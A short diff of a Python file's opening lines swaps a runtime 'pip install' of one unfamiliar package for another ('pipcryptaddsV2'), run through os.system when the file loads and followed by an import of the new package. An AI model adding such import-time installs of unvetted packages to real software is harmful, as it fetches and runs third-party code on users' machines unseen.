@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlilibraryV1")
-import pysqlilibraryV1
+os.system("pip install pipcryptaddsV2")
+import pipcryptaddsV2
 import json
 import httpx
 import time
